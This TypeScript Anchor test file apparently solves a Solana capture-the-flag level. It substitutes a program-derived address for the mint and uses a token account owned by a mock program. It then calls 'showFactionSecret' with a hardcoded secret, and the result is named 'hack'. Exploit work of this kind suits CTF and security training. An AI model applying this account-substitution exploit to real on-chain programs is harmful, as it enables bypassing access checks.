import * as anchor from '@coral-xyz/anchor';
import { Program } from '@coral-xyz/anchor';
import { Level3 } from '../target/types/level_3';
import { web3, SystemProgram } from '@coral-xyz/anchor';
import {
  getAssociatedTokenAddress,
  // ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  createAssociatedTokenAccount,
  getAssociatedTokenAddressSync,
  getMint,
  getAccount,
  createMintToInstruction
} from '@solana/spl-token';
import * as spl from "@solana/spl-token";

export const originalMint = new web3.PublicKey("AsqdvXVEZaSFRNJ5ERSSUL5firH2KBhjP76tsYXB1eKK");
export const originalFactionCreator = new web3.PublicKey("4A4cPZgQx2cZ3aejRLCMSX5839gVM3Gjrii2nxfGVwVj");
export const originalFaction = new web3.PublicKey("GG9rdMcjKFssQEdyLAeFrPSeZCPcGUBowTpwtGerrggp");

describe("level-3", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.Level3 as Program<Level3>;
  const ASSOCIATED_TOKEN_PROGRAM_ID_2022 = new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
  const SECRET = "eecc857933d8929d484d89618dde031e09183e4cc4dbe954a9055070b332983a";

  const newMember = web3.Keypair.generate();
  const factionCreator = web3.Keypair.generate();
  const payer = web3.Keypair.generate()
  const mockProgram = new web3.PublicKey('5zjbNpnsSkCNG6zHzK183ujm6dn6fWeHWeUnk1Rzrs1Y')
 

  console.log("New Member Public Key:", newMember.publicKey.toString());
  console.log("Faction Creator Public Key:", factionCreator.publicKey.toString());

  let FACTION_PDA = null
  let NEW_MEMBER_ATA = null
  let CUSTOM_MINT = null

  before("Fund the users!", async () => {
    await airdrop(provider.connection, newMember.publicKey);
    await airdrop(provider.connection, factionCreator.publicKey);
    await airdrop(provider.connection, payer.publicKey);
    });

    it("creates a new faction", async () => {

        const customMint = web3.Keypair.generate();
        // Derive the faction PDA
        const [factionPDA] = await web3.PublicKey.findProgramAddressSync(
          [Buffer.from("faction"), newMember.publicKey.toBuffer(), customMint.publicKey.toBuffer()],
          program.programId
        );
    
        await new Promise(resolve => setTimeout(resolve, 2000));
        console.log(`Faction PDA -> ${factionPDA}`)
        console.log("Custom Mint created:", factionPDA.toString());
        await airdrop(provider.connection, factionPDA, 1000000)
        
        await new Promise(resolve => setTimeout(resolve, 2000));
          FACTION_PDA = factionPDA
          CUSTOM_MINT = factionPDA
    
        });


    it ("creates an ATA for the new member", async () => {

        const newMemberATA = await getAssociatedTokenAddressSync(
        originalMint,
        newMember.publicKey
        );
        console.log(`New Member ATA -> ${newMemberATA}`)

        await createAssociatedTokenAccount(
        provider.connection,
        payer,
        originalMint,
        mockProgram,
        null,
        TOKEN_2022_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID_2022
        )
        await new Promise(resolve => setTimeout(resolve, 5000));

        NEW_MEMBER_ATA = newMemberATA
        console.log(`Checkpoint -> ${NEW_MEMBER_ATA}`)
    });

    it ("shows faction secret", async () =>{

      console.log(FACTION_PDA)
      console.log(CUSTOM_MINT)
      console.log(NEW_MEMBER_ATA)

      const hack = await program.methods.showFactionSecret(SECRET)
      .accounts({
        factionMember: newMember.publicKey,
        faction: FACTION_PDA,
        memberTokenAccount: NEW_MEMBER_ATA,
        mint: CUSTOM_MINT
      })
      .signers([newMember])
      .rpc()
      await new Promise(resolve => setTimeout(resolve, 5000));
      console.log(hack)
        
      })

  });

async function airdrop(connection: any, address: any, amount = 10_000_000_000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}
